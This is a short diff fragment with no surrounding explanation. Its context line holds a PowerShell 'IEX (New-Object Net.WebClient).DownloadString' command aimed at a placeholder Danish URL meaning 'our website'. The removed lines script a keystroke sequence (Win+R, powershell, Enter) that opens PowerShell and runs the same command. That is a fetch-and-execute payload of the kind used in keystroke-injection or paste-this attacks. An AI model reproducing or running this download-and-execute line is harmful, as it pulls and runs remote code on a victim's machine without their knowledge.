@@ -7,9 +7,3 @@ IEX (New-Object Net.WebClient).DownloadString('https:// vores hjemmeside')
 
 
 
-<windows+r>
-powershell
-<enter>
-
-IEX (New-Object Net.WebClient).DownloadString('https://vores hjemmeside')
-<end>
